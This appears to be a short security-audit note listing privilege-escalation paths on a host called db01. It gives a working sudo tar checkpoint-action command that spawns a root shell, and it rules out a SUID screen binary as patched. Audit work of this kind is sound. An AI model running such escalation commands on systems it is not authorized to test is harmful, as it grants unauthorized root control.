# Privilege escalation paths on db01 (account: auditor)

## Viable path to root

`sudo -l` (`recon/sudo-l.txt`) allows `/usr/bin/tar` with NOPASSWD. tar's checkpoint
callbacks execute commands as root:

```bash
sudo tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

That is the only path found.

## Rejected candidate

`/opt/tools/screen-4.9.1/screen` is SUID root, but the change log shows the host runs the
patched 4.9.1 build, so the <= 4.9.0 escalation does not apply to this version.
